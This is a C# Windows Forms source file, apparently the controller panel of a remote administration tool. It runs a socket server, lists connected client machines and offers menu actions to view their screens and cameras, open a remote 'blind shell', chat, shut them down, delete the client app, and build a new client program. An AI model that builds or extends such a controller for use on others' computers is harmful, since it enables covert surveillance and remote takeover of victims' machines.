using System;
using System.Collections;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;

namespace WindowsFormsApp8
{
    public partial class Main : Form
    {
        private delegate void MouseAnimation();
        private event MouseAnimation m_MouseAnimation;
        private ListViewItem list = default(ListViewItem);
        private ListViewItem GUIclient = default(ListViewItem);
        private SocketServer socket;
        private Pen pen;
        private Graphics graphics;
        private int x, y;

        public Main()
        {
            InitializeComponent();
            this.socket = new SocketServer(this, Clients, HostValue);
            this.ClientsList.MouseMove += MouseMoveEvent;
            this.m_MouseAnimation += MouseDraw; // Future - draw behind the mouse
            this.socket.n_newInstance += NewInstance;
        }

        private void NewInstance(Client client)
        {
            client.m_LogAddValue += LogsAddValue;
            client.a_ListViewAction += listViewItemEdit;
        }

        private void LogsAddValue(string type, string value, string date)
        {
            if (InvokeRequired)
            {
                this.Invoke((MethodInvoker)delegate
                {
                    this.list = new ListViewItem(type);
                    this.list.SubItems.Add(value);
                    this.list.SubItems.Add(date);
                    logView.Items.Add(this.list);
                });
            }
        }

        private void listViewItemEdit(int type, Socket sck, byte[] message, int index)
        {
            ListViewItem GUI = default(ListViewItem);
            switch (type)
            {
                case 0:
                    Task.Run(() =>
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            ListViewItem i = new ListViewItem(sck.RemoteEndPoint.ToString());
                            i.ForeColor = System.Drawing.Color.Red;
                            ClientsList.Items.AddRange(new ListViewItem[] { i });
                            this.GUIclient = ClientsList.FindItemWithText(sck.RemoteEndPoint.ToString());

                            for (int a = 0; a < 7; a++)
                                this.GUIclient.SubItems.Add("");
                        });
                    }); break;

                case 1:
                    this.Invoke((MethodInvoker)delegate
                    {
                        GUI = ClientsList.FindItemWithText(sck.RemoteEndPoint.ToString());
                        if (GUI != null)
                            ClientsList.Items.Remove(GUI);
                    });
                    break;

                case 2:
                    this.Invoke((MethodInvoker)delegate
                    {
                        GUI = ClientsList.FindItemWithText(sck.RemoteEndPoint.ToString());
                        if (GUI != null)
                            ClientsList.Items[GUI.Index].SubItems[index].Text = Encoding.ASCII.GetString(message);
                    });
                    break;
            }
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            ClientsList.MouseUp += MouseEvent;
            FormClosing += FormClose;
            serverCreationStripMenuItem.Click += ServerCreate_click;
        }

        private void MouseDraw()
        {
            this.graphics = this.ClientsList.CreateGraphics();
            this.pen = new Pen(Color.Cyan, 3);
            Task.Run(() =>
            {
                while (lineup.Checked)
                {
                    Thread.Sleep(150);
                    this.Invoke((MethodInvoker)delegate
                    {
                        graphics.Clear(BackColor);
                        ClientsList.Invalidate();
                    });
                }
            });
        }

        void MouseMoveEvent(object sender, MouseEventArgs a)
        {
            if (lineup.Checked)
            {
                graphics.DrawLine(pen, new Point(x, y), a.Location);
                x = a.X;
                y = a.Y;
            }
        }


        private void MouseEvent(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
                StripMenu.Show(Cursor.Position);
        }

        private void ServerCreate_click(object sender, EventArgs e)
        {
            socket.CreateServer();
        }

        private void FormClose(object sender, FormClosingEventArgs e)
        {
            try
            {
                if (!InvokeRequired)
                {
                    try
                    {
                        Environment.Exit(0);
                    }
                    catch { }
                }
                else
                    this.Invoke((MethodInvoker)delegate { Environment.Exit(0); });
            }
            catch { }
        }

        private void disconnectToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            int count = ClientsList.SelectedItems.Count - 1;
            for (int i = count; i >= 0; i--)
            {
                string SelectedClient = ClientsList.SelectedItems[i].Text;
                Client client = socket.GetInstance(SelectedClient);
                client.Send(Encoding.ASCII.GetBytes("\0"), 7);
            }
        }

        private void screenShareToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int count = ClientsList.SelectedItems.Count - 1;
            for (int i = count; i >= 0; i--)
            {
                string SelectedClient = ClientsList.SelectedItems[i].Text;
                Client client = socket.GetInstance(SelectedClient);
                ScreenShare instance = new ScreenShare(client);
                instance.Show();
            }
        }

        private void computerTalkToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int count = ClientsList.SelectedItems.Count - 1;
            for (int i = count; i >= 0; i--)
            {
                string SelectedClient = ClientsList.SelectedItems[i].Text;
                Client client = socket.GetInstance(SelectedClient);

                ComputerTalk instance = new ComputerTalk(client);
                instance.Show();
            }
        }

        private void top_CheckedChanged(object sender, EventArgs e)
        {
            if (top.Checked)
                this.TopMost = true;
            else
                this.TopMost = false;
        }

        private void blindShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count >= 1)
            {
                int count = ClientsList.SelectedItems.Count - 1;
                for (int i = count; i >= 0; i--)
                {
                    string SelectedClient = ClientsList.SelectedItems[i].Text;
                    Client client = socket.GetInstance(SelectedClient);
                    BlindShell shell = new BlindShell(client);
                    shell.Show();
                }
            }
            else
                MessageBox.Show("no client selected");
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count >= 1)
            {
                int count = ClientsList.SelectedItems.Count - 1;
                for (int i = count; i >= 0; i--)
                {
                    string SelectedClient = ClientsList.SelectedItems[i].Text;
                    Client client = socket.GetInstance(SelectedClient);
                    client.Send(Encoding.ASCII.GetBytes("\0"), 14);
                }
            }
            else
                MessageBox.Show("no client selected");
        }

        private void cameraViewToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count >= 1)
            {
                int count = ClientsList.SelectedItems.Count - 1;
                for (int i = count; i >= 0; i--)
                {
                    string SelectedClient = ClientsList.SelectedItems[i].Text;
                    Client client = socket.GetInstance(SelectedClient);

                    CameraView cam = new CameraView(client);
                    cam.Show();
                }
            }
            else
                MessageBox.Show("no client selected");
        }

        private void top_CheckedChanged_1(object sender, EventArgs e)
        {
            this.TopMost = top.Checked;
        }

        private void top_CheckedChanged_2(object sender, EventArgs e)
        {
            this.TopMost = top.Checked;
        }

        private void lineup_CheckedChanged(object sender, EventArgs e)
        {
            m_MouseAnimation.Invoke();
        }

        private void buildProgramToolStripMenuItem_Click(object sender, EventArgs e)
        {
            BuildClientProgram build = new BuildClientProgram(HostValue);
            build.Show();
        }

        private void deleteAppToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count >= 1)
            {
                int count = ClientsList.SelectedItems.Count - 1;
                for (int i = count; i >= 0; i--)
                {
                    string SelectedClient = ClientsList.SelectedItems[i].Text;
                    Client client = socket.GetInstance(SelectedClient);
                    client.Send(Encoding.ASCII.GetBytes("\0"), 23);
                }
            }
            else
                MessageBox.Show("no client selected");
        }

        private void clientChatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ClientsList.SelectedItems.Count >= 1)
            {
                int count = ClientsList.SelectedItems.Count - 1;
                for (int i = count; i >= 0; i--)
                {
                    string SelectedClient = ClientsList.SelectedItems[i].Text;
                    Client client = socket.GetInstance(SelectedClient);
                    client.Send(Encoding.ASCII.GetBytes("\0"), 2);

                    Chat chat = new Chat(client);
                    chat.Show();
                }
            }
            else
                MessageBox.Show("no client selected");
        }
    }
}